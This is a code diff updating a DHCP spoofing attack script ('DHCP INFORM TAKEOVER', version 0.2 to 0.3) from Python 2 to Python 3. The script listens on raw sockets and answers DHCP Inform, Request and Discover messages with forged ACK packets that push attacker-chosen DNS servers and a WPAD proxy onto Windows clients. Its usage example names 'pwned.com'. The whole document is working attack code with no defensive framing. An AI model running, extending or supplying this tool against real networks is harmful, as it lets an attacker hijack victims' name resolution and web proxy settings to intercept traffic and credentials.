@@ -15,15 +15,16 @@
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
 import sys
+if (sys.version_info < (3, 0)):
+   sys.exit('This script is meant to be run with Python3')
 import struct
 import optparse
 import configparser
 import os
-
+import codecs
 BASEDIR = os.path.realpath(os.path.join(os.path.dirname(__file__), '..'))
 sys.path.insert(0, BASEDIR)
 from odict import OrderedDict
-from packets import Packet
 from utils import *
 
 parser = optparse.OptionParser(usage='python %prog -I eth0 -d pwned.com -p 10.20.30.40 -s 10.20.30.1 -r 10.20.40.1', prog=sys.argv[0],)
@@ -54,9 +55,48 @@ elif options.DNSIP2 is None:
     print(color("[!]", 1, 1), "-s mandatory option is missing, please provide the secondary DNS server ip address or yours.")
     exit(-1)
 
+#Python version
+if (sys.version_info > (3, 0)):
+    PY2OR3     = "PY3"
+else:
+    PY2OR3  = "PY2"
+
+def StructWithLenPython2or3(endian,data):
+    #Python2...
+    if PY2OR3 == "PY2":
+        return struct.pack(endian, data)
+    #Python3...
+    else:
+        return struct.pack(endian, data).decode('latin-1')
+
+def NetworkSendBufferPython2or3(data):
+    if PY2OR3 == "PY2":
+        return str(data)
+    else:
+        return bytes(str(data), 'latin-1')
+
+def NetworkRecvBufferPython2or3(data):
+    if PY2OR3 == "PY2":
+        return str(data)
+    else:
+        return str(data.decode('latin-1'))
+
+class Packet():
+	fields = OrderedDict([
+		("data", ""),
+	])
+	def __init__(self, **kw):
+		self.fields = OrderedDict(self.__class__.fields)
+		for k,v in kw.items():
+			if callable(v):
+				self.fields[k] = v(self.fields[k])
+			else:
+				self.fields[k] = v
+	def __str__(self):
+		return "".join(map(str, self.fields.values()))
 
 print('#############################################################################')
-print('##                       DHCP INFORM TAKEOVER 0.2                          ##')
+print('##                       DHCP INFORM TAKEOVER 0.3                          ##')
 print('##                                                                         ##')
 print('##        By default, this script will only inject a new DNS/WPAD          ##')
 print('##                server to a Windows <= XP/2003 machine.                  ##')
@@ -113,7 +153,7 @@ class UDP(Packet):
     ])
 
     def calculate(self):
-        self.fields["Len"] = struct.pack(">h",len(str(self.fields["Data"]))+8)
+        self.fields["Len"] = StructWithLenPython2or3(">h",len(str(self.fields["Data"]))+8)
 
 class DHCPACK(Packet):
     fields = OrderedDict([
@@ -162,14 +202,14 @@ class DHCPACK(Packet):
     ])
 
     def calculate(self):
-        self.fields["Op54Str"]  = socket.inet_aton(DHCPSERVER)
-        self.fields["Op1Str"]   = socket.inet_aton(NETMASK)
-        self.fields["Op3Str"]   = socket.inet_aton(ROUTERIP)
-        self.fields["Op6Str"]   = socket.inet_aton(DNSIP)+socket.inet_aton(DNSIP2)
+        self.fields["Op54Str"]  = socket.inet_aton(DHCPSERVER).decode('latin-1')
+        self.fields["Op1Str"]   = socket.inet_aton(NETMASK).decode('latin-1')
+        self.fields["Op3Str"]   = socket.inet_aton(ROUTERIP).decode('latin-1')
+        self.fields["Op6Str"]   = socket.inet_aton(DNSIP).decode('latin-1')+socket.inet_aton(DNSIP2).decode('latin-1')
         self.fields["Op15Str"]  = DNSNAME
         self.fields["Op252Str"] = WPADSRV
-        self.fields["Op15Len"]  = struct.pack(">b",len(str(self.fields["Op15Str"])))
-        self.fields["Op252Len"] = struct.pack(">b",len(str(self.fields["Op252Str"])))
+        self.fields["Op15Len"]  = StructWithLenPython2or3(">b",len(str(self.fields["Op15Str"])))
+        self.fields["Op252Len"] = StructWithLenPython2or3(">b",len(str(self.fields["Op252Str"])))
 
 class DHCPInformACK(Packet):
     fields = OrderedDict([
@@ -212,14 +252,14 @@ class DHCPInformACK(Packet):
     ])
 
     def calculate(self):
-        self.fields["Op54Str"]  = socket.inet_aton(DHCPSERVER)
-        self.fields["Op1Str"]   = socket.inet_aton(NETMASK)
-        self.fields["Op3Str"]   = socket.inet_aton(ROUTERIP)
-        self.fields["Op6Str"]   = socket.inet_aton(DNSIP)+socket.inet_aton(DNSIP2)
+        self.fields["Op54Str"]  = socket.inet_aton(DHCPSERVER).decode('latin-1')
+        self.fields["Op1Str"]   = socket.inet_aton(NETMASK).decode('latin-1')
+        self.fields["Op3Str"]   = socket.inet_aton(ROUTERIP).decode('latin-1')
+        self.fields["Op6Str"]   = socket.inet_aton(DNSIP).decode('latin-1')+socket.inet_aton(DNSIP2).decode('latin-1')
         self.fields["Op15Str"]  = DNSNAME
         self.fields["Op252Str"] = WPADSRV
-        self.fields["Op15Len"]  = struct.pack(">b",len(str(self.fields["Op15Str"])))
-        self.fields["Op252Len"] = struct.pack(">b",len(str(self.fields["Op252Str"])))
+        self.fields["Op15Len"]  = StructWithLenPython2or3(">b",len(str(self.fields["Op15Str"])))
+        self.fields["Op252Len"] = StructWithLenPython2or3(">b",len(str(self.fields["Op252Str"])))
 
 def SpoofIP(Spoof):
     return ROUTERIP if Spoof else Responder_IP
@@ -242,8 +282,9 @@ def ParseSrcDSTAddr(data):
     return SrcIP, SrcPort, DstIP, DstPort
 
 def FindIP(data):
+    data = data.decode('latin-1')
     IP = ''.join(re.findall(r'(?<=\x32\x04)[^EOF]*', data))
-    return ''.join(IP[0:4])
+    return ''.join(IP[0:4]).encode('latin-1')
 
 def ParseDHCPCode(data):
     PTid        = data[4:8]
@@ -251,52 +292,54 @@ def ParseDHCPCode(data):
     CurrentIP   = socket.inet_ntoa(data[12:16])
     RequestedIP = socket.inet_ntoa(data[16:20])
     MacAddr     = data[28:34]
-    MacAddrStr  = ':'.join('%02x' % ord(m) for m in MacAddr).upper()
+    MacAddrStr  = ':'.join('%02x' % ord(m) for m in MacAddr.decode('latin-1')).upper()
     OpCode      = data[242:243]
     RequestIP   = data[245:249]
 
     # DHCP Inform
-    if OpCode == "\x08":
-        IP_Header = IPHead(SrcIP = socket.inet_aton(SpoofIP(Spoof)), DstIP=socket.inet_aton(CurrentIP))
-        Packet = DHCPInformACK(Tid=PTid, ClientMac=MacAddr, ActualClientIP=socket.inet_aton(CurrentIP),
-                                                        GiveClientIP=socket.inet_aton("0.0.0.0"),
-                                                        NextServerIP=socket.inet_aton("0.0.0.0"),
-                                                        RelayAgentIP=socket.inet_aton("0.0.0.0"),
-                                                        ElapsedSec=Seconds)
+    if OpCode == b"\x08":
+        IP_Header = IPHead(SrcIP = socket.inet_aton(SpoofIP(Spoof)).decode('latin-1'), DstIP=socket.inet_aton(CurrentIP))
+        Packet = DHCPInformACK(Tid=PTid.decode('latin-1'), ClientMac=MacAddr.decode('latin-1'), ActualClientIP=socket.inet_aton(CurrentIP).decode('latin-1'),
+                                                        GiveClientIP=socket.inet_aton("0.0.0.0").decode('latin-1'),
+                                                        NextServerIP=socket.inet_aton("0.0.0.0").decode('latin-1'),
+                                                        RelayAgentIP=socket.inet_aton("0.0.0.0").decode('latin-1'),
+                                                        ElapsedSec=Seconds.decode('latin-1'))
         Packet.calculate()
         Buffer = UDP(Data = Packet)
         Buffer.calculate()
         SendDHCP(str(IP_Header)+str(Buffer), (CurrentIP, 68))
-        return 'Acknowledged DHCP Inform for IP: %s, Req IP: %s, MAC: %s Tid: %s' % (CurrentIP, RequestedIP, MacAddrStr, '0x'+PTid.encode('hex'))
-    elif OpCode == "\x03" and Respond_To_Requests:  # DHCP Request
+        return 'Acknowledged DHCP Inform for IP: %s, Req IP: %s, MAC: %s' % (CurrentIP, RequestedIP, MacAddrStr)
+
+    elif OpCode == b"\x03" and Respond_To_Requests:  # DHCP Request
         IP = FindIP(data)
         if IP:
             IPConv = socket.inet_ntoa(IP)
             if RespondToThisIP(IPConv):
-                IP_Header = IPHead(SrcIP = socket.inet_aton(SpoofIP(Spoof)), DstIP=IP)
-                Packet = DHCPACK(Tid=PTid, ClientMac=MacAddr, GiveClientIP=IP, ElapsedSec=Seconds)
+                IP_Header = IPHead(SrcIP = socket.inet_aton(SpoofIP(Spoof)).decode('latin-1'), DstIP=IP.decode('latin-1'))
+                Packet = DHCPACK(Tid=PTid.decode('latin-1'), ClientMac=MacAddr.decode('latin-1'), GiveClientIP=IP.decode('latin-1'), ElapsedSec=Seconds.decode('latin-1'))
                 Packet.calculate()
                 Buffer = UDP(Data = Packet)
                 Buffer.calculate()
                 SendDHCP(str(IP_Header)+str(Buffer), (IPConv, 68))
-                return 'Acknowledged DHCP Request for IP: %s, Req IP: %s, MAC: %s Tid: %s' % (CurrentIP, RequestedIP, MacAddrStr, '0x'+PTid.encode('hex'))
-    elif OpCode == "\x01" and Respond_To_Requests:  # DHCP Discover
+                return 'Acknowledged DHCP Request for IP: %s, Req IP: %s, MAC: %s' % (CurrentIP, RequestedIP, MacAddrStr)
+
+    elif OpCode == b"\x01" and Respond_To_Requests:  # DHCP Discover
         IP = FindIP(data)
         if IP:
             IPConv = socket.inet_ntoa(IP)
             if RespondToThisIP(IPConv):
                 IP_Header = IPHead(SrcIP = socket.inet_aton(SpoofIP(Spoof)), DstIP=IP)
-                Packet = DHCPACK(Tid=PTid, ClientMac=MacAddr, GiveClientIP=IP, DHCPOpCode="\x02", ElapsedSec=Seconds)
+                Packet = DHCPACK(Tid=PTid.decode('latin-1'), ClientMac=MacAddr.decode('latin-1'), GiveClientIP=IP.decode('latin-1'), DHCPOpCode="\x02", ElapsedSec=Seconds.decode('latin-1'))
                 Packet.calculate()
                 Buffer = UDP(Data = Packet)
                 Buffer.calculate()
                 SendDHCP(str(IP_Header)+str(Buffer), (IPConv, 0))
-                return 'Acknowledged DHCP Discover for IP: %s, Req IP: %s, MAC: %s Tid: %s' % (CurrentIP, RequestedIP, MacAddrStr, '0x'+PTid.encode('hex'))
+                return 'Acknowledged DHCP Discover for IP: %s, Req IP: %s, MAC: %s' % (CurrentIP, RequestedIP, MacAddrStr)
 
 def SendDHCP(packet,Host):
     s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
-    s.sendto(packet, Host)
+    s.sendto(NetworkSendBufferPython2or3(packet), Host)
 
 if __name__ == "__main__":
     s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
@@ -305,7 +348,7 @@ if __name__ == "__main__":
     while True:
         try:
             data = s.recvfrom(65535)
-            if data[0][23:24] == "\x11":  # is udp?
+            if data[0][23:24] == b"\x11":  # is udp?
                 SrcIP, SrcPort, DstIP, DstPort = ParseSrcDSTAddr(data)
 
                 if SrcPort == 67 or DstPort == 67:
